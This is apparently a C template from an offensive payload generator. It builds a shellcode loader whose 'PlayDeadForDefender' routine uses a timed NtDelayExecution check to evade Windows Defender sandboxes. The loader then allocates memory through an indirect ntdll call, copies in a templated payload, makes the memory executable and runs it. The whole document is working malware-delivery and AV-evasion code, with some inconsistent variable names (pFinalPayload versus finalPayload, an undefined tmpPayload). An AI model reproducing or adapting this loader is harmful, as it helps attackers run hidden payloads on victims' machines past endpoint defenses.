int PlayDeadForDefender()
{

    DWORD               dwMilliSeconds        = <%=  random_sleep %>;
	  LARGE_INTEGER       DelayInterval         = { 0 }; 
	  LONGLONG            Delay                 = 0; 
    NTSTATUS            STATUS                = 0;
    DWORD               _T0                   = 0, 
                        _T1                   = 0;
        
    Delay = dwMilliSeconds * 10000;
	  DelayInterval.QuadPart = - Delay;

    _T0 = GetTickCount();
    
    STATUS = CALL_EXPORT_X86("ntdll.dll", "NtDelayExecution", int(*)(BOOLEAN, PLARGE_INTEGER), FALSE, &DelayInterval);
    if (STATUS != 0) {
      return 0;
    }
    
    _T1 = GetTickCount();

    if (_T1 - _T0 < dwMilliSeconds) {
        return 0;
    }

    return 1;
}


int main() {

    DWORD dwOldProtect;
    unsigned long scsize;
    NTSTATUS STATUS = 0;
    PVOID pFinalPayload;
    SIZE_T scsize_t = <%= payload_length %>;
    scsize = <%= payload_length %>;
    
    if( !CALL(&PlayDeadForDefender) )
    {
      return 1;
    }
    
    STATUS = CALL_EXPORT("ntdll.dll", "NtAllocateVirtualMemory", int(*)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG), (HANDLE)-1, &pFinalPayload, 0, &scsize_t, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (STATUS != 0) {
      return 1;
    }

    if(!VirtualProtect(finalPayload, scsize, PAGE_READWRITE, &dwOldProtect))
    {
      return 1;
    }

    CopyMemory(pFinalPayload, tmpPayload, scsize);

    if(!VirtualProtect(finalPayload, scsize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
    {
      return 1;
    }
    
    char * payload_fnc = (char*)finalPayload;
	
    (*(void (*)()) payload_fnc)();

	  return 0;
}

